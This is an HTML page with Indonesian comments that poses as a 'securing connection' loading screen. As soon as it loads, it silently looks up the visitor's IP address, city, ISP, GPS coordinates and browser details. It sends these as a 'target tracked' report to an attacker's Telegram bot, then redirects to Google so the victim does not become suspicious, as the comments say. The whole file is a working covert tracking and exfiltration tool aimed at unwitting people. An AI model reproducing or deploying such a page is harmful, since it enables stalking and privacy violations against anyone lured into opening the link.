<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Sedang Memuat...</title>
    <style>
        body { background: #000; color: #333; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #111; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { margin-top: 15px; font-size: 12px; color: #555; }
    </style>
</head>
<body>

    <div style="text-align: center;">
        <div class="loader"></div>
        <div id="status">Mengamankan koneksi...</div>
    </div>

    <script>
        // --- KONFIGURASI TELEGRAM ---
        const TOKEN = 'TOKEN_BOT_TELEGRAM_LO';
        const CHAT_ID = 'ID_TELEGRAM_LO';
        // ----------------------------

        async function track() {
            try {
                // Ambil data dari API IP-API (Tanpa API Key, gratis & detail)
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                const text = `
ðŸŽ¯ **TARGET TERPELACAK!** ðŸŽ¯
----------------------------------
ðŸŒ **IP Address:** ${data.ip}
ðŸ™ï¸ **Kota:** ${data.city}
ðŸš© **Provinsi:** ${data.region}
ðŸ‡²ðŸ‡¨ **Negara:** ${data.country_name}
ðŸ¢ **ISP/Provider:** ${data.org}
ðŸ“¡ **ASN:** ${data.asn}
ðŸ“ **Koordinat:** ${data.latitude}, ${data.longitude}
â° **Waktu:** ${new Date().toLocaleString()}

ðŸ“± **Info Perangkat:**
- OS: ${navigator.platform}
- Browser: ${navigator.userAgent}
----------------------------------
ðŸ“ **Google Maps Link:** https://www.google.com/maps?q=${data.latitude},${data.longitude}
                `;

                // Kirim ke Telegram
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });

                // Setelah data terkirim, arahkan ke web asli (misal: Google atau YouTube)
                // Biar target nggak curiga
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 2000);

            } catch (error) {
                // Jika gagal, tetap redirect agar tidak curiga
                window.location.href = "https://www.google.com";
            }
        }

        // Jalankan pelacakan otomatis saat web dibuka
        window.onload = track;
    </script>
</body>
</html>
